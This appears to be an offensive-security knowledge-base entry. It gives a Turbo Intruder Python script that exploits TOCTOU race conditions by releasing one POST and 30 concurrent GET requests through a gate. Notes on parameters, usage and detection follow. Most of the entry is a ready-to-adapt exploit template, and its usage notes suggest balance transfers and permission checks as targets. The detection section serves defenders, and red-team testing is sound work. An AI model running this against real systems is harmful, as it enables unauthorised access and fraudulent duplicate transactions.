---
id: 65824004-6728-4922-ba49-831792be0717
name: Turbo-Intruder-Race-Condition-Queue-Requests
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:31.921213+00:00'
updated_at: '2023-04-06T03:56:31.924734+00:00'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - race-condition
  - web-exploitation
  - http-fuzzing
validated: true
---

# Turbo-Intruder-Race-Condition-Queue-Requests

## Code

```python
def queueRequests(target, wordlists): 
    engine = RequestEngine(endpoint=target.endpoint, 
                           concurrentConnections=30, 
                           requestsPerConnection=100, 
                           pipeline=False 
                           ) 
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    ''' 

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30): 
        engine.queue(request2, gate='race1') 
    engine.openGate('race1') 
    engine.complete(timeout=60) 

def handleResponse(req, interesting): 
    table.add(req)
```

## Description

This Python code snippet for Turbo Intruder sets up an engine to send concurrent HTTP requests for exploiting TOCTOU race conditions. It queues a single primary POST request and 30 interfering GET requests behind a 'race1' gate, releasing them simultaneously to overwhelm the target's check-use timing. The handleResponse function logs interesting responses to a table for analysis.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| target.endpoint | Base URL of the target application | http://example.com |
| concurrentConnections | Number of parallel connections (adjust for aggression) | 30 |
| requestsPerConnection | Requests per connection | 100 |
| /target-URI-1 | Path for the primary (check) request | /api/validate-permission |
| <REDACTED> (Host) | Target hostname | target.example.com |
| session=<REDACTED> | Session cookie value | session=abc123 |
| parameterName | Name of the parameter to manipulate | user_id |
| parameterValue | Value for the parameter | 12345 |
| /target-URI-2 | Path for interfering (use) requests | /api/access-resource |
| range(30) | Number of interfering requests | 30 (increase for more pressure) |
| timeout=60 | Completion timeout in seconds | 60 |

## Usage

Save this as a .py file and run with Turbo Intruder (e.g., python turbo_intruder.py script.py). Use in procedures targeting web apps with race-prone endpoints, such as balance transfers or permission checks. Adapt requests from captured traffic via Burp Suite. Ideal for red team simulations of concurrency attacks.

## Detection

- High volume of concurrent requests from a single source in web server logs (e.g., Apache/Nginx access logs showing bursts).
- Anomalous response patterns, like multiple successes for idempotent operations.
- Network monitoring for rapid HTTP POST/GET sequences to the same endpoints (IDS rules for request flooding).
- Application logs showing out-of-order transaction processing.

## Related

- [[procedures/Exploit-TOCTOU-Race-Condition-with-Turbo-Intruder]]
- [[tools/Turbo-Intruder]]
